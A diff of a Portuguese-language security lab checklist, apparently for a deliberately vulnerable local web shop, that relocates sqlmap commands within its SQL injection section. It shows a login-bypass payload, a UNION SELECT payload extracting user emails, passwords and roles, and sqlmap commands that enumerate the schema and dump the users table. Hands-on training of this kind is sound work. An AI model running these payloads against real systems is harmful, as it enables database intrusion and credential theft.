@@ -150,13 +150,8 @@ Payloads projetados para provocar atrasos na execução quando processados ​�
             E-mail = user@dom.net' --
             Senha: qualquer
 
-- [ ] Obtenha o Schema do banco de dados SQL (Dica: sqlmap, método Union).
-```
-sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast --ignore-code=500
-```
-```
-sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4 --no-cast --ignore-code=500
-```
+- [ ] Obtenha o Schema do banco de dados SQL (Dica: payload método Union).
+
 Payloads Schema Database baseados em operador SQL Union.
 
 Usa o operador UNION do SQL para juntar o resultado da busca original do site com os dados obtidos pelo invasor.
@@ -189,7 +184,14 @@ Acrescente os campos importantes para extração dos dados e complete com os nú
 ```
 orange')) UNION SELECT id,username,email,password,role,6,7,8,9 FROM users --
 ```
+- [ ] Obtenha Obtenha o Schema do banco de dados SQL via SQLmap
 
+```
+sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast --ignore-code=500
+```
+```
+sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4 --no-cast --ignore-code=500
+```
 ## 9° Brute Force de Hash
 
 Um ataque de força bruta de hash é um método usado para descobrir a senha original por trás de um código criptografado (o hash) testando milhões de combinações possíveis de palavras e caracteres por segundo.
